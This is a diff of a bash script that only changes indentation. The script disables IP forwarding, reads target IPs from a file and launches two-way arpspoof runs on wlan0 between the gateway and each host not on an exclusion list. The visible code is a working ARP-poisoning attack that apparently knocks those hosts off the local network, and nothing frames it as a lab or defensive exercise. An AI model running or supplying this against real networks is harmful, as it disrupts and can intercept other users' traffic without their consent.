@@ -16,10 +16,10 @@ echo 0 > /proc/sys/net/ipv4/ip_forward
 
 index=0
 while IFS= read -r ipaddr
-		do
-			echo $ipaddr 
-			array[$index]="$ipaddr"
-			index=$(($index+1))
+	do
+		echo $ipaddr 
+		array[$index]="$ipaddr"
+		index=$(($index+1))
 done < ip 
 
 len=${#array[@]}
@@ -40,8 +40,8 @@ for i in `seq 1 10`; do
 	fl=$(array_func $ip)
 
 	if [ $fl == "false" ]; then
-			sudo arpspoof -i wlan0 -t $gateway $ip  & >/dev/null
-			sudo arpspoof -i wlan0 -t $ip $gateway  & >/dev/null
+		sudo arpspoof -i wlan0 -t $gateway $ip  & >/dev/null
+		sudo arpspoof -i wlan0 -t $ip $gateway  & >/dev/null
 	fi
 	echo $ip"-"$fl
 done
